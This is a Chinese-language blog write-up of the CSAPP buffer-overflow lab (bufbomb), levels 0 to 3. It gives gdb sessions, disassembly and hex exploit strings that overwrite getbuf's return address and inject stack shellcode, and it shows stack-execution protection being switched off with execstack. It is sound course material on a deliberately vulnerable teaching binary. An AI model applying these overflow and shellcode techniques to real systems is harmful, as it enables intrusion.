<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb bufbomb</span><br><span class="line">(gdb) b getbuf</span><br><span class="line">(gdb) run -t SAXXXXXXXX</span><br><span class="line">Starting program: /home/ubuntu/桌面/bufferlab/bufbomb -t SAXXXXXXXX</span><br><span class="line">Team: SAXXXXXXXX</span><br><span class="line">Cookie: 0x58932f5a</span><br><span class="line">...</span><br><span class="line">(gdb) x/s $ebp-0xc</span><br><span class="line">0xffffb96c:     &quot;hello world&quot;</span><br></pre></td></tr></table></figure>
<p>所以可以知道字符串首地址<code>0xffffb96c</code>。用smoke函数的地址覆盖getbuf的返回地址，还需要找到函数smoke函数的首地址：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) p/x &amp;smoke</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0x8048e20</span></span><br></pre></td></tr></table></figure>
<p>在test的汇编代码中，getbuf的下一行指令的地址为<code>0x804901e</code>，该地址在调用getbuf后被保存在<code>%ebp+0x4</code>中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08049000 &lt;test&gt;:</span><br><span class="line">...</span><br><span class="line"> 8049019:	e8 c2 ff ff ff       	call   8048fe0 &lt;getbuf&gt;</span><br><span class="line"> 804901e:	89 c2                	mov    %eax,%edx</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/x $ebp+4</span><br><span class="line">0xffffb97c:     0x0804901e</span><br></pre></td></tr></table></figure>
<p>从<code>0xffffb96c</code>覆盖到<code>0xffffb97c</code>，需要先填充
16字节字符串内容，然后填充smoke函数的地址：<code>20</code>,<code>8e</code>,<code>04</code>,<code>08</code>（小端机器），如果是
64 位机器则需要继续覆盖后面为
0。所以我们需要构造字符串十六进制表示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// exploit0.txt</span><br><span class="line">31 31 31 31 31 31 31 31 </span><br><span class="line">32 32 32 32 32 32 32 32 </span><br><span class="line">20 8e 04 08 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>使用工具生成字符串并运行程序，结果如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">./sendstring &lt; exploit0.txt &gt; exploit<span class="literal">-raw</span>.txt</span><br><span class="line">./bufbomb <span class="literal">-t</span> SAXXXXXXXX &lt; exploit<span class="literal">-raw</span>.txt</span><br></pre></td></tr></table></figure>
<p><img src="/post/ba783922/image-20221029171139653.png"></p>
<h3 id="level-1-sparkler">Level 1: Sparkler</h3>
<blockquote>
<p>目标：调用 fizz(val) 函数，并将自己的 cookies
传递为参数。（Cookie必须为自己学号生成）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fizz</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    entry_check(<span class="number">1</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打印该函数地址：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(gdb) x/x fizz</span><br><span class="line"><span class="number">0</span>x8048dc0 &lt;fizz&gt;:       <span class="number">0</span>x53e58955</span><br></pre></td></tr></table></figure>
<p>生成cookie：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">./makecookie SAXXXXXXXX</span><br><span class="line"><span class="number">0</span>x58932f5a</span><br></pre></td></tr></table></figure>
<p>部分反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048dc0 &lt;fizz&gt;:</span><br><span class="line">...</span><br><span class="line"> 8048dc4:	83 ec 14             	sub    $0x14,%esp</span><br><span class="line"> 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx	# 传入参数值</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>通过阅读汇编代码可以知道，0x8(%ebp)是传入的参数的存放地址，即$ebp+8,这里需要将其覆盖为生成的cookie值作为输入，而$ebp+4是原来正常的返回地址，需要覆盖为fizz的地址<code>0x8048dc0</code>。构造输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// exploit1.txt</span><br><span class="line">31 31 31 31 31 31 31 31 </span><br><span class="line">32 32 32 32 32 32 32 32 </span><br><span class="line">c0 8d 04 08 00 00 00 00 </span><br><span class="line">5a 2f 93 58 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>使用工具生成字符串并运行程序，结果如下：</p>
<p><img src="/post/ba783922/image-20221029190954349.png"></p>
<h3 id="level-2-firecracker">Level 2: Firecracker</h3>
<blockquote>
<p>目标：含有一个 bang 函数，和一个全局变量
global_value，需要注入机器代码，修改 global_value 为 cookies
的值，再调用 bang
函数。具体指令构造方法参加实验说明文档。可通过execstack工具解除栈执行限制。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bang</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    entry_check(<span class="number">2</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    <span class="keyword">if</span> (global_value == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>bang 汇编语言的前几行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048d60 &lt;bang&gt;:</span><br><span class="line"> 8048d60:	55                   	push   %ebp</span><br><span class="line"> 8048d61:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d63:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d66:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)</span><br><span class="line"> 8048d6d:	e8 2e fc ff ff       	call   80489a0 &lt;entry_check&gt;</span><br><span class="line"> 8048d72:	a1 dc a1 04 08       	mov    0x804a1dc,%eax	#get global_value</span><br><span class="line"> 8048d77:	3b 05 cc a1 04 08    	cmp    0x804a1cc,%eax	#cmp global_value:cookie</span><br><span class="line"> 8048d7d:	74 21                	je     8048da0 &lt;bang+0x40&gt;</span><br></pre></td></tr></table></figure>
<p>汇编语言的第7、8行对应源程序的if语句，所以猜测global_value被存储在<code>0x804a1dc</code>中，cookie被存储在<code>0x804a1cc</code>中。检查如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(gdb) x/x <span class="number">0</span>x804a1dc</span><br><span class="line"><span class="number">0</span>x804a1dc &lt;global_value&gt;: <span class="number">0</span>x00000000</span><br><span class="line">(gdb) x/x <span class="number">0</span>x804a1cc</span><br><span class="line"><span class="number">0</span>x804a1cc &lt;cookie&gt;:     <span class="number">0</span>x00000000</span><br></pre></td></tr></table></figure>
<p>思路是将汇编代码注入到char数组的首地址<code>0xffffb96c</code>，让char数组的首地址覆盖$eax+4y原来的返回地址，当发生ret时，就会跳转到char数组首地址执行注入的汇编代码。汇编代码中要先修改global_value的值，然后将
bang 函数的地址 push 进栈中，然后使用 ret
命令。当执行到注入的ret命令时，因为push了bang函数的地址，就会返回到bang函数执行。汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl  $0x58932f5a, 0x804a1dc		# global_value=cookie</span><br><span class="line">pushl $0x08048d60					# 将 bang 函数的首地址压入栈</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>将汇编语言转换成十六进制的机器代码：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">gcc <span class="literal">-m32</span> <span class="literal">-c</span> example.s </span><br><span class="line">objdump <span class="literal">-d</span> example.o &gt; example.d</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	c7 05 dc a1 04 08 5a 	movl   $0x58932f5a,0x804a1dc</span><br><span class="line">   7:	2f 93 58 </span><br><span class="line">   a:	68 60 8d 04 08       	push   $0x8048d60</span><br><span class="line">   f:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>构造注入机器代码，转成字符串并运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// exploit2.txt</span><br><span class="line">c7 05 dc a1 04 08 5a 2f </span><br><span class="line">93 58 68 60 8d 04 08 c3</span><br><span class="line">6c b9 ff ff 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>结果出现段错误，是因为Linux系统默认开启了栈保护机制，用于阻止缓冲区溢出攻击。所以不可以在栈中直接执行指令，需要使用execstack工具解除栈执行限制。即使如此也只能在gdb调试下有效，实际运行仍然会出现段错误。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sudo apt<span class="literal">-get</span> install execstack 	<span class="comment">#安装execstack</span></span><br><span class="line">execstack <span class="literal">-s</span> bufbomb			<span class="comment">#修改程序堆栈的可执行属性</span></span><br></pre></td></tr></table></figure>
<p><img src="/post/ba783922/image-20221029201251844.png" style="zoom:80%;"></p>
<p><img src="/post/ba783922/image-20221029202121258.png"></p>
<h3 id="level-3-dynamite">Level 3: Dynamite</h3>
<blockquote>
<p>目标：这个 Level 要求我们注入一段能够修改 getbuf
返回值的代码，返回值从 1 改成 cookie
值，此外还需要还原所有破坏，继续运行 test 的剩下部分。函数正常返回时执行
第15行，我们要让函数执行第12行</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    entry_check(<span class="number">3</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数的返回值保存在%eax中，所以将cookie值放入这个寄存器中，并将原来正确的返回地址（即call
<getbuf>的下一条指令地址<code>0x804901e</code>）压入栈中，构造完成攻击的汇编代码如下:</getbuf></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl $0x58932f5a, %eax		#move cookie to %eax, return %eax</span><br><span class="line">push $0x804901e				#push &lt;test&gt; return address</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>将汇编语言转换成十六进制的机器代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 5a 2f 93 58       	mov    $0x58932f5a,%eax</span><br><span class="line">   5:	68 1e 90 04 08       	push   $0x804901e</span><br><span class="line">   a:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>生成的机器代码一共是11个字节，再加上一个对齐字节凑足12字节，可以看到这时已经填满了char字符串的缓冲区。与上一个问题相同，还要用char字符串首地址<code>0xffffb96c</code>覆盖原来的返回地址，以便于执行注入的指令。但这里还要注意一点，为了保证栈不被破坏，除了必要的修改，我们必须保持其他的栈字保存不变，先打印出原来的数据：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">24</span>xb <span class="number">0</span>xffffb96c</span><br><span class="line"><span class="number">0</span>xffffb96c:     <span class="number">0</span>x31    <span class="number">0</span>x32    <span class="number">0</span>x33    <span class="number">0</span>x34    <span class="number">0</span>x00    <span class="number">0</span>x00    <span class="number">0</span>x00    <span class="number">0</span>x00</span><br><span class="line"><span class="number">0</span>xffffb974:     <span class="number">0</span>xc0    <span class="number">0</span>xb5    <span class="number">0</span>x04    <span class="number">0</span>x08    <span class="number">0</span>x98    <span class="number">0</span>xb9    <span class="number">0</span>xff    <span class="number">0</span>xff</span><br><span class="line"><span class="number">0</span>xffffb97c:     <span class="number">0</span>x1e    <span class="number">0</span>x90    <span class="number">0</span>x04    <span class="number">0</span>x08    <span class="number">0</span>x03    <span class="number">0</span>x00    <span class="number">0</span>x00    <span class="number">0</span>x00</span><br></pre></td></tr></table></figure>
<p>构造攻击代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// exploit3.txt</span><br><span class="line">b8 5a 2f 93 58 68 1e 90 </span><br><span class="line">04 08 c3 00 98 b9 ff ff</span><br><span class="line">6c b9 ff ff 03 00 00 00</span><br></pre></td></tr></table></figure>
<p>转成字符串并运行：</p>
<p><img src="/post/ba783922/image-20221029210254503.png"></p>
]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
</search>
